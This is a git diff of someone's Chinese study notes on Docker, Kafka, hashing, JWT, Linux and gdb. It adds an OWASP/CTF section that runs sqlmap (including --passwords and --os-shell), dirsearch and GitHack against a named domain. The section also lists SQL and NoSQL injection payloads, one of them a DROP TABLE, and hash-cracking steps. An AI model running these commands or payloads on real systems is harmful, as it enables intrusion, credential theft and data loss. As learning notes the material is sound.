@@ -816,18 +816,25 @@ date: 2019-05-13 14:42:09
   - pact
 - [Docker](https://www.docker.com/)
   - Docker命令
-    - docker images
-    - docker ps
-    - docker run
-    - docker search
-    - docker logs
-    - docker cp
+    - `docker search ubuntu`
+    - `docker pull ubuntu`
+    - `docker images`
+    - `docker ps`
+    - `docker run -itd <image id>`
+      - `docker run --cap-add=SYS_PTRACE --security-opt seccomp=unconfined` 解决gdb不能run问题
+    - `docker exec -it <container id> bash`
+      - `exit`
+    - `docker logs`
+    - `docker cp ./a.txt <container id>:/root/`
+    - `docker commit <container id> <a name for new image>`
   - 镜像 容器 仓库
   - 四种网络模式
     - bridge 桥接模式
     - host 模式
     - container 模式
     - none 模式
+  - [docker compose](https://docs.docker.com/compose/):  同时起好几个docker，并相互协作
+    - docker-compose.yml
 - etcd
 - BASE（反ACID）
   - 牺牲高一致性，获得可用性或可靠性
@@ -862,6 +869,8 @@ date: 2019-05-13 14:42:09
 
 
 # Java
+- 新特性
+  - [Java 9 新特性概述](https://developer.ibm.com/zh/articles/the-new-features-of-java-9/)
 - JVM
   - [GC](https://fanjingdan012.github.io/2019/04/10/GC/)
   - [JMM](https://fanjingdan012.github.io/2019/04/10/GC/Memory.png)
@@ -1044,6 +1053,11 @@ date: 2019-05-13 14:42:09
   - 函数指针 `int (* p)(int, int) = & max; //max 是个函数`
     - 调用： `d=p(a,b);`
 
+# Python
+- anaconda
+  - `conda-env list`
+- python exit:
+  - `exit()`
 
 
 # Spring
@@ -1369,6 +1383,8 @@ date: 2019-05-13 14:42:09
   - rabbitmq
   - rocketmq
   - [kafka](http://kafka.apache.org/quickstart)
+    - 启动
+      - `./kafka-server-start.sh ../config/server.properties`
     - 概念
       - producer
       - consumer
@@ -1417,6 +1433,8 @@ date: 2019-05-13 14:42:09
     - [源码](https://github.com/apache/kafka)
 - [Nginx](https://www.nginx.com/)
 - [Zookeeper](https://zookeeper.apache.org/releases.html)
+  - 启动
+    - `./zookeeper-server-start.sh ../config/zookeeper.properties`
   - 原理
     - Observer模式
   - Client API
@@ -1492,20 +1510,34 @@ date: 2019-05-13 14:42:09
   - 消息认证码
     - MAC(Message Authentication Code)
     - Hash，有些简单hash直接google一下就出来了
-      - MD5
+      -  [which hash](https://hashcat.net/wiki/doku.php?id=example_hashes)
+      - MD5: 32/16
         - MD2,MD4(x)
       - SHA
-        - SHA-1(x)
-        - SHA-256
-        - SHA-384
-        - SHA-512
+        - SHA-1(x): 40
+        - SHA-256: 256bit=64hex (n/4)
+        - SHA-384: 384bit=96hex
+        - SHA-512: 512bit=128hex
       - RIPEMD-160
+      - win zip hash
+        - [structure](https://hashcat.net/forum/thread-7968.html)
+      - tools
+        - [hashcat](https://hashcat.net/)
+          - install
+          - [hashcat-utils](https://github.com/hashcat/hashcat-utils/releases)
+        - [john the ripper](https://www.openwall.com/john/)
+          - `zip2john <zip_file> > <password_file>`
+        - cewl 收集字典
+          -  `cewl https://www.hbo.com/game-of-thrones -w gameOfThrone.txt -d 3`
+
   - Key
     - PBKDF1/PBKDF2 (Password-Based Key Derivation Function)
 - 编码
-  - ascii
-  - Base64, Base32, Base16
-  - 培根密码，AB替换字母
+  - [ascii](https://www.systutorials.com/f/2013/ascii.txt)
+  - Base64
+  - Base32
+  - Base16
+  - 培根密码，AB表01替换字母
   - 摩尔斯电码
 - 综合案例
   - [bitcoin]()
@@ -1522,6 +1554,12 @@ date: 2019-05-13 14:42:09
         - "alg": "HS256",  "typ": "JWT"等
       - Payload
         - ROLE,SCOPE,Username等
+        - jti: token uuid
+        - iat: issued at
+        - nbf: not effective before
+        - exp: expire
+        - fresh: boolean
+        - type: "access"
       - verify signature
         - 可以用hash:HMACSHA256
         - 可以用RSA签名
@@ -1536,18 +1574,89 @@ date: 2019-05-13 14:42:09
 - Authorization：这个用户是不是允许访问这些资源，他是什么role，role含有哪些权限
 
 - OWASP&CTF
+  - CTF cheat sheets
+    - [sheet 1](https://dvd848.github.io/CTFs/CheatSheet.html)
+    - [sheet 2](https://github.com/uppusaikiran/awesome-ctf-cheatsheet#awesome-ctf-cheatsheet-)
   - [web-hacking-101](https://wizardforcel.gitbooks.io/web-hacking-101/content/)
-    -
+    - name server `nslookup www.baidu.com`
+    - [412 precondition](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/412)
+    - 攻击
+      - [csrf 攻击](https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)
+      - xss
+      - phishing 偷 cookie
+      - phishing 偷 token
+    - tools
+      - [subdomain scan](https://subdomainfinder.c99.nl/index.php)
+      - [Phishing 查询被调参数神站](https://postb.in/)
+      - path scan
+        - [dirsearch](https://github.com/maurosoria/dirsearch)
+          - `~/opt/anaconda3/bin/python dirsearch.py -e php,txt,gitignore,Dockerfile -u https://robokracy.com`
+      - port scan
+        - [nmap](https://nmap.org/download.html)
+      - 抓包工具
+        - [wireshark](https://www.wireshark.org/download.html)
+          - [从http数据包获取用户登陆信息](https://blog.csdn.net/wangqingchuan92/article/details/81095871)
+      - Git 项目还原
+        - [Git Hack](https://github.com/lijiejie/GitHack)
+          - `python GitHack.py https://robokracy.com/.git `
   - C语言
     - buffer overflow
       - 命令行输入0x0：Ctrl+Shift+2
     - printf 格式化字符串攻击
+    - ELF(Executable and Linkable Format, 其实就是linux可执行文件)反编译
+      - 可以尝试的命令
+        - `readelf -a <elf file>`
+        - `objdump -S <elf file>`
+        - `gdb <elf file>`
+        - `strings <elf file>` 可以发现打包工具之类的
+      - [UPX packing](https://upx.github.io/)
+        - 安装
+          - centos
+            ```sh
+            wget -c http://ftp.tu-chemnitz.de/pub/linux/dag/redhat/el7/en/x86_64/rpmforge/RPMS/ucl-1.03-2.el7.rf.x86_64.rpm
+            rpm -Uvh ucl-1.03-2.el7.rf.x86_64.rpm
+            yum install ucl
+
+            wget -c http://ftp.tu-chemnitz.de/pub/linux/dag/redhat/el7/en/x86_64/rpmforge/RPMS/upx-3.91-1.el7.rf.x86_64.rpm
+            rpm -Uvh upx-3.91-1.el7.rf.x86_64.rpm
+            yum install upx
+            ```
+        - `upx -d <exeutable file>` 解压
+
+      - 反编译工具
+        - objdump
+        - ida
+        - [ollydbg](http://www.ollydbg.de/)
+      - debugger
+        - ida
+        - gdb
+  - Android
+    - 反编译APK
+      - [Online Android APK Decompile Tool](https://www.toolfk.com/tool-decompile-apk)
+      - [自己反编译](https://www.zhihu.com/question/29370382)
+        - [Apktool](https://ibotpeaches.github.io/Apktool/install/)
+          - 这个实际没啥用，win直接改后缀为zip，winrar解压，mac直接`unzip <xx.apk>`
+        - [dex2jar](https://sourceforge.net/projects/dex2jar/files/)
+          - 这个最重要`./d2j-dex2jar.sh classes.dex`
+        - [jd-gui](http://java-decompiler.github.io/)
+          - 这个也无所谓，直接找随便一个项目，idea导入为lib，就能看见源代码了
   - sql injection
-    - nosql injection
+    - [sqlmap](http://sqlmap.org/)
+      - `~/opt/anaconda3/bin/python sqlmap.py -u http://robokracy.com:18443/admin.php --batch --banner`
+      - `~/opt/anaconda3/bin/python sqlmap.py -u http://robokracy.com:18443/admin.php --batch --passwords`
+      - `~/opt/anaconda3/bin/python sqlmap.py -u http://robokracy.com:18443/admin.php --batch --dbs`
+      - `~/opt/anaconda3/bin/python sqlmap.py -u http://robokracy.com:18443/admin.php --batch --tables -D testdb`
+      - `~/opt/anaconda3/bin/python sqlmap.py -u http://robokracy.com:18443/admin.php --batch --os-shell`
+    - `admin or 1=1--`
+    - `admin or 1=1)--`
+    - `" or ""="`
+    - `105; DROP TABLE Suppliers`
+  - nosql injection
+    - `username[$ne]=help&password[$ne]=help&login=login`
   - 图片
     - common
       - 文件meta
-      - StegSolve
+      - [StegSolve](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install)
     - jpg
       - FFD8~FFD9
         - copy命令
@@ -1562,5 +1671,72 @@ date: 2019-05-13 14:42:09
         - active scan
         - passive scan
 
-
 # Linux
+- shell
+  - 目录文件
+    - `cp -R dir1 dir2`
+    - `mv dir1 dir2`
+    - `mkdir -p a/b/c/d`
+    - `find . -iname 'abc'`
+  - 网络
+    - `lsof -i :12345`
+      - list open files with port 12345
+  - 线程
+    - `kill -9 <pid>`
+  - `uname -a`  查看操作系统信息
+  - `file <file>` 查看这是啥文件
+  - txt处理
+    - `cat a.txt|sort|uniq` 排序，去重
+    - awk
+      - csv
+        - `awk -F "\"*,\"*" '{print $3}' data.csv`
+      - count
+        - `awk -F ',' ' {c[$1]++} END{ for (i in c) printf("%s\t%s\n",i,c[i]) }' data.csv`
+        - `awk '{ print $1}' system-access.log.txt | sort | uniq -c | sort -nr | head -n 10`
+    - sort
+      - `sort --field-separator='\t' --key=2,1`
+- 安装
+  - `apt-get install binutils`
+    - objdump
+      - `objdump -D <file>`
+      - `objdump -S <file>`
+    - readelf
+      - `readelf -a <file>`
+  - `apt-get install gdb`
+    - gdb
+      - `printf "%s", <address>`
+      - `gdb <program>`
+      - `gdb <program> <core_dump>`
+      - `run`
+      - `quit`
+      - `continue`
+      - `break <function>`
+      - `info break`
+      - `delete <breakpoint>`
+      - `step`
+      - `stepi`
+      - `next`
+      - `nexti`
+      - `finish`
+      - `print <expression>`
+      - `x /<nfu> <addr>`
+      - `info variables`
+      - `info locals`
+      - `info args`
+      - `list`
+      - `disassemble`
+      - `backtrace`
+      - `frame <n>`
+      - `info threads`
+      - `thread apply all <command>`
+      - `thread <ThreadNumber>`
+      - `until`
+      - `info address <address>`
+      - `info proc mappings`
+
+
+# MAC
+- lock screen = Command + Ctrl + Q
+- use brew install
+- sublime
+  - alt+f3 = Command + Ctrl + G
